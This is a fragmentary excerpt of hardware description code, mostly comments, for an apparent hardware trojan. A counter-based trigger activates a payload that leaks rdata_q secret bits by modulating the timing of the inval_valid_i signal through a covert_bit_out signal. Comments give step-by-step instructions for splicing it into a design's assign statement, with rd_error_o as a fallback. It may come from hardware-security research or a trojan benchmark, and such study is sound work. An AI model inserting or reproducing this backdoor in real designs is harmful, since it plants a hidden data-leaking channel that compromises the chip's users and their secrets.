 ...
 *   
 * Trigger: Counter on data
 * Payload: Modulate inval_valid_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of inval_valid_i:
...
logic       covert_bit_out;         // Drives inval_valid_i when trojan active
...
//   Find the assign for inval_valid_i (or rd_error_o as fallback):
//     assign inval_valid_i = <normal_expr>;
//   Replace with:
//     assign inval_valid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
